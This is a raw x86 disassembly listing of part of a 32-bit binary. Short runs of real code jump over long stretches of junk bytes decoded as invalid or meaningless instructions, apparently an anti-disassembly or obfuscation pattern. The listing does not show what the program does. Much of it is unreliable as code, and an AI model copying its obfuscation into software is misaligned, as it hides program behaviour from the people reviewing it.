  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x76ec9643]
  408bcf:	pop    edx
  408bd0:	bound  ebx,QWORD PTR [ebx]
  408bd2:	sub    eax,0xa7e7e2e
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408be8
  408bdb:	les    edi,FWORD PTR [esi]
  408bdd:	shr    ch,cl
  408bdf:	xchg   ecx,eax
  408be0:	add    DWORD PTR [esp+edi*1+0x50],eax
  408be4:	add    dh,al
  408be6:	sbb    al,0x64
  408be8:	cs jp  0x408c36
  408beb:	outs   dx,BYTE PTR ds:[esi]
  408bec:	into   
  408bed:	jecxz  0x408b70
  408bef:	jge    0x408c41
  408bf1:	pop    es
  408bf2:	(bad)  
  408bf4:	mov    ecx,0x13223024
  408bf9:	pop    edx
  408bfa:	sub    ecx,DWORD PTR [ecx+0x493063e4]
  408c00:	sub    eax,0x29b9fbbe
  408c05:	push   0x41c7ed99
  408c0a:	inc    edi
  408c0b:	xor    cl,dl
  408c0d:	neg    bh
  408c0f:	mov    eax,ds:0x2eb4fc69
  408c14:	dec    edx
  408c15:	outs   dx,DWORD PTR ds:[esi]
  408c16:	push   es
  408c17:	and    al,BYTE PTR [ecx-0xc7557f7]
  408c1d:	cmp    DWORD PTR [ebx+0x47],eax
  408c20:	and    al,0xae
  408c22:	imul   eax,DWORD PTR [ebx-0x8],0x967b7b3b
  408c29:	mov    bl,0xe0
  408c2b:	add    ah,ah
  408c2d:	out    0x9e,eax
  408c2f:	adc    DWORD PTR [ebp+edi*4+0x5e14cd83],edi
  408c36:	or     eax,0x10dcbd0a
  408c3b:	daa    
  408c3c:	loop   0x408c62
  408c3e:	(bad)  
  408c3f:	jno    0x408ca3
  408c41:	add    ebx,edx
  408c43:	or     edx,esp
  408c45:	(bad)  
  408c46:	int    0x81
  408c48:	inc    ecx
  408c49:	fcmovnb st,st(0)
  408c4b:	add    DWORD PTR [edx-0x15],edx
  408c4e:	pop    esp
  408c4f:	fs xchg esi,eax
  408c51:	retf   
  408c52:	add    eax,0x86e154d0
  408c57:	retf   0x7504
  408c5a:	push   esi
  408c5b:	mov    bl,0x59
  408c5d:	mov    DWORD PTR [eax-0x6e],eax
  408c60:	push   ds
  408c61:	jp     0x408c91
  408c63:	mov    ds:0x684fffc5,al
  408c68:	mov    edx,0x180e9d93
  408c6d:	push   cs
  408c6e:	std    
  408c6f:	das    
  408c70:	shl    ah,0xd2
  408c73:	pop    ecx
  408c74:	dec    edi
  408c75:	rcl    dl,cl
  408c77:	sti    
  408c78:	hlt    
  408c79:	mov    ds,WORD PTR [ebx+0x4a]
  408c7c:	shl    ecx,1
  408c7e:	ret    0x22d
  408c81:	push   ebx
  408c82:	mov    DWORD PTR [ebp+0x3f],ebp
  408c85:	es ins WORD PTR es:[edi],dx
  408c88:	or     cl,BYTE PTR ds:0x9a7a63a1
  408c8e:	shr    cl,1
  408c90:	inc    ebx
  408c91:	add    esi,ebx
  408c93:	cmp    bh,al
  408c95:	divps  xmm3,xmm4
  408c98:	mov    bl,dh
  408c9a:	or     al,0x82
  408c9c:	and    dl,0x3e
  408c9f:	pop    eax
  408ca0:	jl     0x408d05
  408ca2:	(bad)  
  408ca4:	out    0xf9,al
  408ca6:	jo     0x408cc6
  408ca8:	cmp    ecx,DWORD PTR [ebp-0x25]
  408cab:	mov    cl,BYTE PTR [ecx-0x5b6fbea8]
  408cb1:	and    eax,0x7b0efb6d
  408cb6:	pop    ebx
  408cb7:	add    BYTE PTR [ecx+0x62fe3f77],0x27
  408cbe:	sub    al,0x42
  408cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc1:	or     al,0xa2
  408cc3:	enter  0x44f4,0x8e
  408cc7:	mov    ch,0xb0
  408cc9:	bound  ecx,QWORD PTR [eax+eax*1]
  408ccc:	fs stos BYTE PTR es:[edi],al
  408cce:	retf   
  408ccf:	rcr    ah,cl
  408cd1:	pop    eax
  408cd2:	xor    bh,BYTE PTR [edi-0x39]
  408cd5:	and    ebx,DWORD PTR [esi+ecx*4+0x66]
  408cd9:	cmc    
  408cda:	out    0xcf,eax
  408cdc:	cmp    dh,BYTE PTR [ecx+0x77]
  408cdf:	jno    0x408d32
  408ce1:	addr16 push ebx
  408ce3:	lock jmp 0x408cc0
  408ce6:	movzx  eax,WORD PTR [eax+edx*4]
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x8ca3
  408d20:	data16 mov bh,BYTE PTR fs:[ecx]
  408d24:	das    
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408cf3
  408d2c:	call   0xdef6:0xd6ff4ca1
  408d33:	xchg   esi,eax
  408d34:	adc    BYTE PTR [ebp+0x28c503c9],dl
  408d3a:	xor    eax,0x75cb8d34
  408d3f:	(bad)  
  408d40:	lea    ecx,[esi-0x58]
  408d43:	(bad)  
  408d44:	std    
  408d45:	pop    esp
  408d46:	or     bh,BYTE PTR [edi]
  408d48:	push   eax
  408d49:	je     0x408dad
  408d4b:	ja     0x408d6d
  408d4d:	mov    esi,0xbe5e5c95
  408d52:	fs mov esp,0xca6b488a
  408d58:	jno    0x408d29
  408d5a:	stos   BYTE PTR es:[edi],al
  408d5b:	ret    0x9311
  408d5e:	sub    eax,0x239c4b5e
  408d63:	fiadd  DWORD PTR [esi-0x4e]
  408d66:	dec    edx
  408d67:	das    
  408d68:	mov    bl,0x49
  408d6a:	in     eax,dx
  408d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d6c:	pop    ss
  408d6d:	ins    BYTE PTR es:[edi],dx
  408d6e:	add    al,0xea
  408d70:	leave  
  408d71:	jb     0x408d12
  408d73:	shl    BYTE PTR [ecx],1
  408d75:	mov    ah,0x1d
  408d77:	vpand  xmm1,xmm0,xmm4
  408d7b:	add    bh,dl
  408d7d:	add    al,0xcd
  408d7f:	add    al,0x46
  408d81:	imul   BYTE PTR [esi+0x1a092f44]
  408d87:	xchg   esp,eax
  408d88:	push   eax
  408d89:	jge    0x408d12
  408d8b:	mov    ds:0xbc5af447,al
  408d90:	aad    0xe
  408d92:	xchg   ecx,edi
  408d94:	test   al,0xb8
  408d96:	icebp  
  408d97:	pop    ecx
  408d98:	fstp   QWORD PTR [edi]
  408d9a:	fnsave [ebx]
  408d9c:	mov    al,ds:0x8a6ac36b
  408da1:	ja     0x408e07
  408da3:	jmp    0xbe90:0x9c4075bc
  408daa:	push   cs
  408dab:	push   esp
  408dac:	push   0x3572c9df
  408db1:	sbb    al,dh
  408db3:	sub    eax,0xcf5ef93c
  408db8:	dec    ebx
  408db9:	mul    BYTE PTR [eax+0x10]
  408dbc:	test   edx,0x55a779f1
  408dc2:	mov    ds:0xd5fb0179,eax
  408dc7:	pop    es
  408dc8:	jb     0x408d4d
  408dca:	pop    ds
  408dcb:	xchg   esi,eax
  408dcc:	(bad)  
  408dcd:	or     edx,DWORD PTR [ebp-0x5f5ac53e]
  408dd3:	call   0x939d8719
  408dd8:	(bad)  
  408dd9:	ds inc esp
  408ddb:	dec    edi
  408ddc:	xor    BYTE PTR [edx-0xbead21f],ch
  408de2:	push   edx
  408de3:	nop
  408de4:	jmp    FWORD PTR [eax]
  408de6:	ds dec ecx
  408de8:	sbb    al,0x0
  408dea:	push   ebx
  408deb:	xor    edi,DWORD PTR [ebx]
  408ded:	push   edx
  408dee:	dec    ebp
  408def:	inc    esp
  408df0:	popf   
  408df1:	test   al,0x1a
  408df3:	jge    0x408d95
  408df5:	add    DWORD PTR [edx-0x1d],eax
  408df8:	xlat   BYTE PTR ds:[ebx]
  408df9:	pop    ebx
  408dfa:	mov    al,ds:0x1dc8852f
  408dff:	pop    edx
  408e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e01:	fadd   st(2),st
  408e03:	push   DWORD PTR [edx]
  408e05:	daa    
  408e06:	mov    WORD PTR [edx-0x179c69dd],ss
  408e0c:	out    dx,al
  408e0d:	sti    
  408e0e:	into   
  408e0f:	call   0x1efb06a
  408e14:	jbe    0x408e0c
  408e16:	and    BYTE PTR [eax+0x66],cl
  408e19:	repnz xchg esi,eax
  408e1b:	les    ecx,FWORD PTR [ebx+0x43]
  408e1e:	pop    ss
  408e1f:	outs   dx,DWORD PTR ds:[esi]
  408e20:	pop    eax
  408e21:	rcr    DWORD PTR [edi+0x6c],1
  408e24:	xchg   edx,eax
  408e25:	mov    WORD PTR [ebx],?
  408e27:	je     0x408dd5
  408e29:	test   eax,0x593837f5
  408e2e:	call   0xe6:0x9f8b5226
  408e35:	out    0x63,eax
  408e37:	add    eax,esi
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x24fbde2b
  408e4e:	pop    edi
  408e4f:	inc    esi
  408e50:	xor    eax,0xa7e7e2c
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e46
  408e59:	and    eax,ebx
  408e5b:	adc    eax,DWORD PTR [ebp+0xc8215c1]
  408e61:	ret    0xe185
  408e64:	mov    eax,ds:0x8ada308
  408e69:	pop    ecx
  408e6a:	adc    ah,BYTE PTR [edx]
  408e6c:	mov    DWORD PTR [ebx-0x1ee29f6d],ebp
  408e72:	xchg   edi,ecx
  408e74:	sbb    BYTE PTR [eax+0x40],ch
  408e77:	cmp    edi,edi
  408e79:	mov    eax,0x428278dc
  408e7e:	ja     0x408ec5
  408e80:	or     BYTE PTR [esi+0xffd53ab],cl
  408e86:	dec    ebp
  408e87:	xchg   edi,eax
  408e88:	neg    DWORD PTR [edx-0x22]
  408e8b:	fcom   QWORD PTR [ecx]
  408e8d:	pop    es
  408e8e:	addr16 cmp dl,0x4b
  408e92:	sub    ah,ch
  408e94:	ds add eax,0xa6b2509b
  408e9a:	xlat   BYTE PTR ds:[ebx]
  408e9b:	sub    DWORD PTR [ebp+0x4be00763],esi
  408ea1:	cwde   
  408ea2:	xchg   edx,eax
  408ea3:	jnp    0x408ee0
  408ea5:	aam    0x31
  408ea7:	leave  
  408ea8:	les    ebx,FWORD PTR [eax]
  408eaa:	out    0x65,eax
  408eac:	stc    
  408ead:	ins    BYTE PTR es:[edi],dx
  408eae:	mov    ss,WORD PTR ds:0xb87ede16
  408eb4:	jmp    0xd5e2274
  408eb9:	retf   0xe33b
  408ebc:	jmp    0x99e704f9
  408ec1:	ins    BYTE PTR es:[edi],dx
  408ec2:	mov    dl,0x35
  408ec4:	repnz push ebp
  408ec6:	add    al,0xc6
  408ec8:	add    bh,BYTE PTR [edi]
  408eca:	test   DWORD PTR [edx-0x5685a6c8],ebx
  408ed0:	lods   eax,DWORD PTR ds:[esi]
  408ed1:	push   esi
  408ed2:	xor    al,0x1
  408ed4:	(bad)  
  408ed5:	xor    edx,DWORD PTR [edx]
  408ed7:	std    
  408ed8:	sub    ch,BYTE PTR [ebp+0x2f]
  408edb:	cmp    dh,BYTE PTR ss:[eax-0x7bb0e0de]
  408ee2:	cli    
  408ee3:	jp     0x408eb2
  408ee5:	mov    al,ds:0x84a92b60
  408eea:	mov    ah,0x25
  408eec:	jno    0x408e82
  408eee:	sbb    BYTE PTR [ebx],al
  408ef0:	push   eax
  408ef1:	int    0x6
  408ef3:	xlat   BYTE PTR ds:[ebx]
  408ef4:	and    bl,BYTE PTR ds:0xb090114d
  408efa:	inc    ebp
  408efb:	lock mov dh,0xd5
  408efe:	mov    ds:0x7e852236,al
  408f03:	mov    al,ds:0x8d7f5d8c
  408f08:	pop    es
  408f09:	cmp    al,BYTE PTR [eax+edi*4+0x33]
  408f0d:	sbb    al,al
  408f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f10:	test   eax,0x6980bee
  408f15:	add    bl,BYTE PTR [eax-0x41]
  408f18:	data16 mov ss,WORD PTR [ebx+0x3e]
  408f1c:	pop    edx
  408f1d:	hlt    
  408f1e:	cmp    ah,BYTE PTR [eax+eiz*4+0x2cc5cc64]
  408f25:	fld    TBYTE PTR [eax+0x77]
  408f28:	clc    
  408f29:	mov    edx,0xb4a96db7
  408f2e:	and    al,0x90
  408f30:	pop    esi
  408f31:	dec    eax
  408f32:	mov    dh,0xb4
  408f34:	jg     0x408f26
  408f36:	fild   QWORD PTR [edx+0x0]
  408f39:	call   0xa4ad:0x86522344
  408f40:	push   ecx
  408f41:	fdiv   DWORD PTR [edi]
  408f43:	mov    BYTE PTR [ebx],dh
  408f45:	je     0x408fb7
  408f47:	(bad)  
  408f48:	mov    dl,0xc8
  408f4a:	pop    ebx
  408f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f4c:	popa   
  408f4d:	xchg   ebp,eax
  408f4e:	mov    ?,esp
  408f50:	sub    DWORD PTR [ebx-0x5291071c],0xe4b7ef
  408f5a:	in     al,0xac
  408f5c:	retf   0x79cf
  408f5f:	or     eax,0x7ef308b5
  408f64:	mov    eax,DWORD PTR [ebp-0x8]
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xbe92b935
  408fab:	or     bh,BYTE PTR [eax]
  408fad:	shr    DWORD PTR ds:0x7f0a7e7e,0x7e
  408fb4:	jle    0x408ff0
  408fb6:	add    eax,DWORD PTR [ebp+edi*2+0x3c751545]
  408fbd:	in     al,dx
  408fbe:	bound  ebx,QWORD PTR [ebx]
  408fc0:	sub    al,0x43
  408fc2:	jl     0x40902b
  408fc4:	dec    esi
  408fc5:	lods   eax,DWORD PTR ds:[esi]
  408fc6:	xor    DWORD PTR [esi+0x65],0x5e
  408fca:	mov    edi,esi
  408fcc:	xchg   BYTE PTR [ebp-0x1e],dl
  408fcf:	retf   
  408fd0:	jle    0x408ff4
  408fd2:	lahf   
  408fd3:	and    ecx,esi
  408fd5:	imul   ebp,DWORD PTR [ebx+0x54],0xfffffffb
  408fd9:	push   edi
  408fda:	or     BYTE PTR [esi-0x6ed71e7d],dh
  408fe0:	ja     0x40900f
  408fe2:	test   eax,0x546ebe61
  408fe7:	add    eax,eax
  408fe9:	nop
  408fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408feb:	popf   
  408fec:	pop    ebp
  408fed:	(bad)  
  408fee:	(bad)  
  408fef:	js     0x408f7a
  408ff1:	test   DWORD PTR [esi],0xf340972b
  408ff7:	loopne 0x409040
  408ff9:	xor    DWORD PTR [esp+eax*4-0x20c02809],eax
  409000:	jg     0x408fb5
  409002:	repz or dl,BYTE PTR [edi+0x7b1a4591]
  409009:	fwait
  40900a:	test   al,0xd
  40900c:	and    ah,dl
  40900e:	xor    DWORD PTR [esi+edi*8+0xcea7999],esi
  409015:	jg     0x408ff7
  409017:	aad    0x42
  409019:	mov    edx,0xd4bd7ab8
  40901f:	sbb    ebp,DWORD PTR [ebp-0x1a]
  409022:	jno    0x408fb2
  409024:	or     BYTE PTR [esi],ah
  409026:	mov    eax,ds:0x4ac81a82
  40902b:	or     ah,BYTE PTR [ebx]
  40902d:	sub    DWORD PTR [ebx],edx
  40902f:	or     BYTE PTR [edx],cl
  409031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409032:	enter  0xd2e8,0x75
  409036:	mov    esp,0x3c115563
  40903b:	add    dh,dh
  40903d:	ja     0x40903b
  40903f:	dec    ebp
  409040:	sub    BYTE PTR [ebx+0x1608e9dd],ah
  409046:	jl     0x40904c
  409048:	add    dl,BYTE PTR [edx-0xf]
  40904b:	call   0x46e973a9
  409050:	mov    ds:0xf274a3da,eax
  409055:	add    BYTE PTR [ecx+0x58e05be2],cl
  40905b:	ss cmp al,0x48
  40905e:	adc    eax,0xe2d4cd87
  409063:	push   ebx
  409064:	xor    DWORD PTR [esi-0x36],edx
  409067:	sbb    eax,ebx
  409069:	dec    ebx
  40906a:	cmp    al,bh
  40906c:	xchg   edi,eax
  40906d:	sub    ecx,DWORD PTR [eax]
  40906f:	daa    
  409070:	cmp    esi,DWORD PTR [eax]
  409072:	pop    edi
  409073:	xchg   DWORD PTR [edi-0x30],ebx
  409076:	mov    ah,0xf0
  409078:	in     al,dx
  409079:	mov    BYTE PTR [eax+0x13],bl
  40907c:	iret   
  40907d:	shl    BYTE PTR [bx+di-0x2b],1
  409081:	mov    esp,0x1f7d90ac
  409086:	std    
  409087:	jmp    0x409100
  409089:	and    al,0x9d
  40908b:	add    dh,BYTE PTR [edx+0x5e50d182]
  409091:	dec    ecx
  409092:	sub    al,0x39
  409094:	xor    DWORD PTR [esi+0x568631ba],esp
  40909a:	adc    ebp,DWORD PTR [ebp+0xb]
  40909d:	jge    0x4090ff
  40909f:	push   ss
  4090a0:	mov    cl,0x46
  4090a2:	pop    esi
  4090a3:	jp     0x4090ec
  4090a5:	mov    eax,0x2a134f66
  4090aa:	adc    edi,DWORD PTR [ecx]
  4090ac:	sbb    eax,DWORD PTR [edx-0x5f]
  4090af:	fisubr DWORD PTR [edx+ebp*4-0x1cafb6fb]
  4090b6:	loop   0x409060
  4090b8:	and    eax,DWORD PTR [edx-0x58ccb482]
  4090be:	in     eax,dx
  4090bf:	jge    0x4090a1
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	test   dh,dl
  4090fc:	imul   ebp,DWORD PTR [ebx-0x23],0xa7e7e22
  409103:	jg     0x409183
  409105:	jle    0x4090fb
  409107:	xchg   esi,eax
  409108:	or     edx,ecx
  40910a:	pop    ebx
  40910b:	jmp    0xe8e:0x4042d633
  409112:	and    al,BYTE PTR [ecx+0x51902d45]
  409118:	shl    DWORD PTR [ecx-0x520950c8],1
  40911e:	test   BYTE PTR [ebp-0x7e],cl
  409121:	xor    ecx,DWORD PTR [ebx+0x9]
  409124:	inc    ecx
  409125:	pop    esp
  409126:	es (bad) 
  409128:	sbb    al,0x41
  40912a:	sahf   
  40912b:	or     DWORD PTR [esi+ebx*4+0x2b],esi
  40912f:	jecxz  0x409149
  409131:	fist   WORD PTR [edx]
  409133:	test   dl,cl
  409135:	jl     0x4090c4
  409137:	jae    0x4091a6
  409139:	push   ss
  40913a:	pop    es
  40913b:	push   edx
  40913c:	cs repz popa 
  40913f:	rcl    DWORD PTR [esi],1
  409141:	out    0x53,al
  409143:	pop    edx
  409144:	rcr    al,0xa3
  409147:	adc    al,0xa7
  409149:	ldmxcsr DWORD PTR [edi-0xa]
  40914d:	mov    edx,0x35ecde6f
  409152:	sbb    eax,0x8d5c1eed
  409157:	nop
  409158:	das    
  409159:	jmp    0xf78bc7ef
  40915e:	jb     0x40916b
  409160:	or     eax,0x16190110
  409165:	popa   
  409166:	sar    DWORD PTR [eax],1
  409168:	adc    al,0x4b
  40916a:	xchg   edi,eax
  40916b:	push   esi
  40916c:	mov    al,0xfd
  40916e:	dec    edx
  40916f:	cmp    ah,ah
  409171:	xor    DWORD PTR [edi+eiz*4],edi
  409174:	paddb  mm6,QWORD PTR [esi-0x7f]
  409178:	add    BYTE PTR [edx],ah
  40917a:	push   ebp
  40917b:	cmp    ah,BYTE PTR [esi-0x33]
  40917e:	icebp  
  40917f:	fmul   DWORD PTR [eax+0x761cbd84]
  409185:	jle    0x4091e5
  409187:	hlt    
  409188:	pop    esp
  409189:	mov    bl,0xbb
  40918b:	mov    ebx,0x55ffa86a
  409190:	xor    cl,BYTE PTR [ecx+ecx*1+0x7d51f720]
  409197:	imul   esp,ecx,0xcd593188
  40919d:	mov    edi,0x46d467df
  4091a2:	jge    0x4091c3
  4091a4:	es mov al,0xc6
  4091a7:	and    cl,BYTE PTR [esi+0x5]
  4091aa:	mov    bh,0xae
  4091ac:	call   0x9c0d:0x8e4fda26
  4091b3:	in     al,0xe6
  4091b5:	gs inc esi
  4091b7:	and    eax,0xe167a2ba
  4091bc:	jb     0x409223
  4091be:	pop    ecx
  4091bf:	cmp    al,BYTE PTR [ecx]
  4091c1:	das    
  4091c2:	jecxz  0x409192
  4091c4:	xchg   esi,eax
  4091c5:	(bad)
  4091c8:	cmp    bh,dh
  4091ca:	xchg   edx,eax
  4091cb:	mov    eax,0x3ece9832
  4091d0:	pop    ebp
  4091d1:	(bad)  
  4091d2:	jmp    0x409224
  4091d4:	in     al,0xf9
  4091d6:	ss pusha 
  4091d8:	lea    edi,[edx]
  4091da:	add    DWORD PTR [ebp-0x8],eax
  4091dd:	mov    ecx,0xfec93949
  4091e2:	into   
  4091e3:	ins    DWORD PTR es:[edi],dx
  4091e4:	(bad)  [ebx]
  4091e6:	push   edx
  4091e7:	arpl   WORD PTR [ebp+0x7f0d3ec],di
  4091ed:	jmp    0xb83cacf1
  4091f2:	shr    BYTE PTR [ebp+0x6c],cl
  4091f5:	adc    al,0xc5
  4091f7:	mov    edi,0xe939aa91
  4091fc:	repz sti 
  4091fe:	in     al,0xd5
  409200:	pop    edi
  409201:	or     DWORD PTR [eax],esp
  409203:	sub    BYTE PTR [edi+0xe],0x12
  409207:	fdivp  st(2),st
  409209:	mov    bl,0xb6
  40920b:	iret   
  40920c:	jnp    0x4091ac
  40920e:	inc    ebp
  40920f:	imul   eax,esp,0xffffffab
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x8785839]
  409240:	test   DWORD PTR [edi+eax*4+0x7e7e23e9],eax
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x4091eb
  40924c:	psadbw mm6,mm3
  40924f:	adc    al,0x8c
  409251:	dec    ebp
  409252:	cwde   
  409253:	lds    esp,FWORD PTR [esi+0x66]
  409256:	and    bl,bl
  409258:	pusha  
  409259:	aaa    
  40925a:	jge    0x409265
  40925c:	add    DWORD PTR [ecx],edi
  40925e:	mov    ch,0x7c
  409260:	fcomip st,st(7)
  409262:	out    0xd7,eax
  409264:	lods   eax,DWORD PTR ds:[esi]
  409265:	out    0xc0,al
  409267:	popa   
  409268:	adc    eax,0x4a2f2eeb
  40926d:	sbb    al,0x1b
  40926f:	xlat   BYTE PTR ds:[ebx]
  409270:	inc    ecx
  409271:	inc    ecx
  409272:	inc    ebx
  409273:	xchg   esp,eax
  409274:	data16 mov WORD PTR [esi],ds
  409277:	scas   al,BYTE PTR es:[edi]
  409278:	lods   eax,DWORD PTR ds:[esi]
  409279:	int    0xd0
  40927b:	out    dx,eax
  40927c:	pushf  
  40927d:	in     eax,dx
  40927e:	mov    gs,WORD PTR [eax+0x14]
  409281:	xor    DWORD PTR [ebx-0x48b845ae],esp
  409287:	dec    edx
  409288:	mov    bh,0x30
  40928a:	push   edx
  40928b:	pop    ebp
  40928c:	test   BYTE PTR [edx+0x5e],ah
  40928f:	inc    ecx
  409290:	fild   QWORD PTR [eax]
  409292:	addr16 leave 
  409294:	jno    0x409295
  409296:	call   0xd461a239
  40929b:	dec    ebp
  40929c:	mov    esp,0x8d64f1bd
  4092a1:	js     0x40929a
  4092a3:	daa    
  4092a4:	push   es
  4092a5:	lea    ebx,ds:0x84f8e494
  4092ab:	sahf   
  4092ac:	or     DWORD PTR [ecx-0x6e7cf8f1],edi
  4092b2:	sub    al,0x2d
  4092b4:	out    dx,eax
  4092b5:	lahf   
  4092b6:	mov    eax,ds:0x93237133
  4092bb:	xor    BYTE PTR [edi-0xc],0x4a
  4092bf:	loopne 0x4092ab
  4092c1:	ins    DWORD PTR es:[edi],dx
  4092c2:	pop    esp
  4092c3:	sub    DWORD PTR [edi-0x66],esi
  4092c6:	jnp    0x40924d
  4092c8:	cmc    
  4092c9:	mov    ebx,0x6d832d77
  4092ce:	mov    cl,0xc4
  4092d0:	std    
  4092d1:	or     dl,BYTE PTR [eax+0x5ddc6b46]
  4092d7:	rep ins DWORD PTR es:[edi],dx
  4092d9:	cmp    bh,bh
  4092db:	mov    ah,0xed
  4092dd:	push   esp
  4092de:	mov    BYTE PTR [ebx],al
  4092e0:	cmp    al,0x4f
  4092e2:	ins    DWORD PTR es:[edi],dx
  4092e3:	mov    WORD PTR [ebx+0x23ee65d2],?
  4092e9:	mov    edi,DWORD PTR [ebp+0x15c736ba]
  4092ef:	shl    DWORD PTR [eax+0x7350a70],cl
  4092f5:	cdq    
  4092f6:	les    eax,FWORD PTR [ebp+0x23]
  4092f9:	in     eax,dx
  4092fa:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092fc:	push   ss
  4092fd:	popa   
  4092fe:	sub    BYTE PTR [eax],ch
  409300:	sub    DWORD PTR [edx-0x1edbcb04],ebx
  409306:	addr16 inc edx
  409308:	cmp    esi,eax
  40930a:	dec    ecx
  40930b:	(bad)  
  40930c:	push   ebp
  40930d:	add    al,0x5f
  40930f:	pop    ds
  409310:	xor    al,0xa1
  409312:	xor    eax,0x1a07d30
  409317:	xor    al,0x9a
  409319:	jne    0x409399
  40931b:	jns    0x40930c
  40931d:	ins    BYTE PTR es:[edi],dx
  40931e:	(bad)  
  40931f:	div    BYTE PTR [ebx*2-0x21435bf7]
  409326:	sub    BYTE PTR [esi+eiz*2-0x212115cf],0x20
  40932e:	out    dx,al
  40932f:	sbb    al,0xb8
  409331:	xor    DWORD PTR [edx+0x67],ebp
  409334:	mov    eax,0x76d43082
  409339:	inc    esp
  40933a:	sahf   
  40933b:	or     BYTE PTR [ebx],al
  40933d:	lahf   
  40933e:	lahf   
  40933f:	push   es
  409340:	sub    bl,BYTE PTR [eax-0x53]
  409343:	rcr    DWORD PTR [ebx],1
  409345:	mov    edi,0x71c569fe
  40934a:	aaa    
  40934b:	(bad)  
  40934c:	mov    cl,0xed
  40934e:	or     ebx,DWORD PTR [eax]
  409350:	push   ebp
  409351:	popf   
  409352:	cli    
  409353:	xor    DWORD PTR [ebp-0x65],edx
  409356:	les    ecx,FWORD PTR [ebx-0x39fcefb3]
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
